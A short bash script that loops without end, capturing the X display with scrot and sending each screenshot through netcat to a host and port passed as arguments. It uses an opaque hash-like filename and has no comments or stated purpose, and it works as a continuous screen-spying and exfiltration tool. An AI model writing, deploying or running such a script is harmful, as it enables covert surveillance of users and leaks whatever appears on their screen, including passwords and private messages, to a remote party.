#!/bin/bash

export DISPLAY=:0

while true; do
    scrot -mz 59bcc3ad6775562f845953cf01624225.jpg
    cat 59bcc3ad6775562f845953cf01624225.jpg | nc $1 $2
done
